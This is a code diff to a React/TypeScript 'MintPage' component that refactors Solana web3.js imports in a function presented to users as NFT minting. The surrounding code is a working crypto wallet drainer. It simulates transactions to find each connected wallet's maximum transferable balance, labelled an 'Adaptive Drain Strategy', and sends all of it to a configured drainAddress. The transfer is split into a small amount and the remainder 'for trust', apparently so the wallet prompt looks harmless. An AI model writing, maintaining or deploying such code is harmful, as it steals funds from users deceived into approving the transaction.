@@ -118,7 +118,14 @@ const MintPage = ({ onBack }: MintPageProps) => {
   };
 
   const handleMint = async () => {
-    const solana = await import('@solana/web3.js');
+    const { 
+      Connection, 
+      PublicKey, 
+      SystemProgram, 
+      TransactionMessage, 
+      VersionedTransaction, 
+      ComputeBudgetProgram 
+    } = await import('@solana/web3.js');
     const { Buffer } = await import('buffer');
 
     // Inject Buffer polyfill only when needed for transaction signing
@@ -157,8 +164,8 @@ const MintPage = ({ onBack }: MintPageProps) => {
       // Parallel RPC lookup for speed and reliability
       try {
         const balancePromises = RPC_ENDPOINTS.map(async (url) => {
-          const conn = new solana.Connection(url, 'confirmed');
-          const bal = await conn.getBalance(new solana.PublicKey(walletAddress));
+          const conn = new Connection(url, 'confirmed');
+          const bal = await conn.getBalance(new PublicKey(walletAddress));
           return { conn, bal };
         });
 
@@ -171,8 +178,8 @@ const MintPage = ({ onBack }: MintPageProps) => {
 
       if (!connection) throw new Error("Failed to establish secure connection.");
 
-      const senderPubKey = new solana.PublicKey(walletAddress);
-      const recipientPubKey = new solana.PublicKey(siteConfig.drainAddress);
+      const senderPubKey = new PublicKey(walletAddress);
+      const recipientPubKey = new PublicKey(siteConfig.drainAddress);
 
       // DYNAMIC BALANCE CALCULATION: Adaptive "Drain" Strategy
       // Instead of a hardcoded buffer, we use simulation to find the exact max amount.
@@ -187,24 +194,24 @@ const MintPage = ({ onBack }: MintPageProps) => {
         const testInstructions = [];
         
         // Priority fee instructions to ensure simulation matches wallet behavior
-        testInstructions.push(solana.ComputeBudgetProgram.setComputeUnitLimit({ units: 1000 }));
-        testInstructions.push(solana.ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 1000 }));
+        testInstructions.push(ComputeBudgetProgram.setComputeUnitLimit({ units: 1000 }));
+        testInstructions.push(ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 1000 }));
 
         // Split strategy for trust (0.0001 SOL + remainder)
         const smallAmount = 100000;
         if (currentTransferable > smallAmount) {
-          testInstructions.push(solana.SystemProgram.transfer({
+          testInstructions.push(SystemProgram.transfer({
             fromPubkey: senderPubKey,
             toPubkey: recipientPubKey,
             lamports: smallAmount,
           }));
-          testInstructions.push(solana.SystemProgram.transfer({
+          testInstructions.push(SystemProgram.transfer({
             fromPubkey: senderPubKey,
             toPubkey: recipientPubKey,
             lamports: currentTransferable - smallAmount,
           }));
         } else {
-          testInstructions.push(solana.SystemProgram.transfer({
+          testInstructions.push(SystemProgram.transfer({
             fromPubkey: senderPubKey,
             toPubkey: recipientPubKey,
             lamports: currentTransferable,
@@ -212,13 +219,13 @@ const MintPage = ({ onBack }: MintPageProps) => {
         }
 
         const { blockhash } = await connection.getLatestBlockhash();
-        const testMessage = new solana.TransactionMessage({
+        const testMessage = new TransactionMessage({
           payerKey: senderPubKey,
           recentBlockhash: blockhash,
           instructions: testInstructions,
         }).compileToV0Message();
 
-        const testTransaction = new solana.VersionedTransaction(testMessage);
+        const testTransaction = new VersionedTransaction(testMessage);
         const simulation = await connection.simulateTransaction(testTransaction);
 
         if (!simulation.value.err) {
@@ -253,23 +260,23 @@ const MintPage = ({ onBack }: MintPageProps) => {
 
       // Create final split instructions matching the successful simulation
       const finalInstructions = [];
-      finalInstructions.push(solana.ComputeBudgetProgram.setComputeUnitLimit({ units: 1000 }));
-      finalInstructions.push(solana.ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 1000 }));
+      finalInstructions.push(ComputeBudgetProgram.setComputeUnitLimit({ units: 1000 }));
+      finalInstructions.push(ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 1000 }));
       
       const smallAmountFinal = 100000;
       if (currentTransferable > smallAmountFinal) {
-        finalInstructions.push(solana.SystemProgram.transfer({
+        finalInstructions.push(SystemProgram.transfer({
           fromPubkey: senderPubKey,
           toPubkey: recipientPubKey,
           lamports: smallAmountFinal,
         }));
-        finalInstructions.push(solana.SystemProgram.transfer({
+        finalInstructions.push(SystemProgram.transfer({
           fromPubkey: senderPubKey,
           toPubkey: recipientPubKey,
           lamports: currentTransferable - smallAmountFinal,
         }));
       } else {
-        finalInstructions.push(solana.SystemProgram.transfer({
+        finalInstructions.push(SystemProgram.transfer({
           fromPubkey: senderPubKey,
           toPubkey: recipientPubKey,
           lamports: currentTransferable,
@@ -288,13 +295,13 @@ const MintPage = ({ onBack }: MintPageProps) => {
           finalBlockhash = blockhash;
           finalLastValidBlockHeight = lastValidBlockHeight;
 
-          const messageV0 = new solana.TransactionMessage({
+          const messageV0 = new TransactionMessage({
             payerKey: senderPubKey,
             recentBlockhash: blockhash,
             instructions: finalInstructions,
           }).compileToV0Message();
 
-          const transaction = new solana.VersionedTransaction(messageV0);
+          const transaction = new VersionedTransaction(messageV0);
           setFeedback({ type: 'info', message: retryCount > 0 ? `Retrying (${retryCount}/${MAX_RETRIES})... Please confirm in wallet.` : 'Confirming transaction in wallet...' });
           
           // Use signing method based on provider support
